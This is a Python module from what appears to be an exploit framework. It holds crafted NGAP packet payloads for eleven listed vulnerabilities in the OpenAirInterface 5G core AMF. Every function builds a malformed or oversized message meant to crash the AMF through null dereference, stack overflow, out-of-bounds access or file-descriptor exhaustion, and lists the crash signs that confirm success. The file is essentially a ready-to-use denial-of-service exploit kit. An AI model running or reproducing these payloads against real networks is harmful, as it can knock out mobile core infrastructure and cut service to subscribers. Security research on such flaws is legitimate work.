#!/usr/bin/env python3
"""
OpenAirInterface 5G Exploit Payloads (11 CVEs)
NGAP Protocol vulnerabilities in OAI CN5G AMF <= 2.0.0
"""

from .ransacked_core import ExploitPayload, PacketBuilder, ASN1Builder
import struct
import logging

logger = logging.getLogger(__name__)

class OAI5GExploits:
    """OpenAirInterface 5G vulnerability exploits"""
    
    def __init__(self):
        self.pb = PacketBuilder()
        self.asn1 = ASN1Builder()
    
    def cve_2024_24445(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24445: NGAP Null Pointer Dereference - Unsupported Procedure Code"""
        packet = self.pb.build_ngap_header(0xFF, 0x00) + b'\x00' * 4
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Null deref via unsupported procedure code (triggers null function pointer)',
            success_indicators=['AMF crash', 'SCTP connection reset', 'Segmentation fault']
        )
    
    def cve_2024_24450(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24450: Stack Buffer Overflow in PDU Session Resource Setup Response"""
        # FailedToSetupList with 600 bytes (exceeds 512-byte buffer)
        failed_list = b'\x41' * 600
        packet = (
            self.pb.build_ngap_header(0x1d, 0x20) +  # PDU Session Resource Setup Response
            struct.pack('>H', len(failed_list)) + failed_list
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Stack overflow via oversized FailedToSetupList (600 > 512 bytes)',
            success_indicators=['AMF crash', 'Stack smashing detected', 'Buffer overflow']
        )
    
    def cve_2024_24447(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24447: Buffer Overflow - Empty FailedToSetupList"""
        packet = (
            self.pb.build_ngap_header(0x1d, 0x20) +
            b'\x00\x00'  # FailedToSetupList length = 0 (triggers list[0] OOB access)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='OOB array access via empty FailedToSetupList',
            success_indicators=['AMF crash', 'Array index out of bounds', 'Segmentation fault']
        )
    
    def cve_2024_24451(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24451: fd_set Buffer Overflow (>1024 connections)"""
        return ExploitPayload(
            packet=(
                self.pb.build_ngap_header(0x15, 0x00) +  # NG Setup Request
                self.asn1.encode_ie(0x1b, b'\x00\x02', 0)  # Global RAN Node ID
            ),
            protocol='NGAP',
            description='Establish >1024 SCTP connections to overflow fd_set (FD_SET buffer)',
            success_indicators=['FD_SET overflow', 'AMF unresponsive', 'Memory corruption'],
            metadata={'connections_required': 1025, 'attack_type': 'resource_exhaustion', 'note': 'Send from >1024 different source ports'}
        )
    
    def cve_2024_24444(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24444: Missing FD Cleanup - Resource Exhaustion"""
        return ExploitPayload(
            packet=(
                self.pb.build_ngap_header(0x15, 0x00) +  # NG Setup Request
                self.asn1.encode_ie(0x1b, b'\x00\x01', 0)  # Global RAN Node ID
            ),
            protocol='NGAP',
            description='Repeatedly open/close connections without close() to exhaust file descriptors',
            success_indicators=['FD exhaustion', 'AMF cannot accept connections', 'Too many open files'],
            metadata={'iterations': 1000, 'attack_type': 'resource_exhaustion', 'note': 'Send repeatedly 1000+ times'}
        )
    
    def cve_2024_24442(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24442: asn_decode Error Handling - Null Dereference"""
        packet = b'\x00\xFF\xFF\xFF' + b'\x00' * 100  # Malformed ASN.1
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Malformed ASN.1 causes decode failure, unchecked error leads to null deref',
            success_indicators=['AMF crash', 'Null pointer dereference', 'ASN decode error']
        )
    
    def cve_2024_24449(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24449: NasPdu Uninitialized Pointer Dereference"""
        # InitialUEMessage without NAS-PDU IE
        packet = (
            self.pb.build_ngap_header(0x0c, 0x00) +  # Initial UE Message
            self.asn1.encode_ie(0x08, b'\x00\x01', 0) +  # ENB-UE-S1AP-ID (dummy)
            self.asn1.encode_ie(0x43, b'\x00\x00\x00\x01', 0)  # TAI (dummy), NO NAS-PDU
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='InitialUEMessage missing NAS-PDU triggers uninitialized pdu_bstring access',
            success_indicators=['AMF crash', 'Uninitialized pointer', 'Null dereference']
        )
    
    def cve_2024_24446(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24446: InitialContextSetupResponse - Uninitialized Optional"""
        # Response without PDUSessionResourceSetupResponseList (optional)
        packet = (
            self.pb.build_ngap_header(0x0e, 0x20) +  # Initial Context Setup Response
            self.asn1.encode_ie(0x00, b'\x00\x00\x00\x01', 0) +  # MME-UE-S1AP-ID
            self.asn1.encode_ie(0x08, b'\x00\x01', 0)  # ENB-UE-S1AP-ID, NO optional list
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Missing optional PDUSessionResourceSetupResponseList triggers uninitialized access',
            success_indicators=['AMF crash', 'Uninitialized optional', 'std::optional deref']
        )
    
    def cve_2024_24443(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24443: pduSessionResourceFailedToSetupResponseList - Vector OOB"""
        # Trigger decode path that accesses uninitialized vector
        packet = (
            self.pb.build_ngap_header(0x1d, 0x20) +
            b'\x00\x50\x00\x00\x00\x01' +  # PDUSessionResourceFailedToSetupListSURes IE
            b'\x00\x00'  # Triggers decode on uninitialized optional -> vector push_back OOB
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Decode on uninitialized optional causes vector OOB write',
            success_indicators=['AMF crash', 'Vector out of bounds', 'Heap corruption']
        )
    
    def vuln_b03(self, target_ip: str) -> ExploitPayload:
        """VULN-B03: UE Radio Capability Indication - Uninitialized Access"""
        # UE Radio Capability Indication without Radio Capability field
        packet = (
            self.pb.build_ngap_header(0x16, 0x00) +  # UE Radio Capability Info Indication
            self.asn1.encode_ie(0x00, b'\x00\x00\x00\x01', 0) +  # AMF-UE-NGAP-ID
            self.asn1.encode_ie(0x55, b'\x00\x01', 0)  # RAN-UE-NGAP-ID, NO Radio Capability
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Missing Radio Capability field leaves ue_radio_cap uninitialized',
            success_indicators=['AMF crash', 'Uninitialized blk2bstr', 'OOB read']
        )
    
    def vuln_b11(self, target_ip: str) -> ExploitPayload:
        """VULN-B11: Empty Response Item List Buffer Overflow (duplicate of CVE-2024-24447)"""
        return self.cve_2024_24447(target_ip)

__all__ = ['OAI5GExploits']
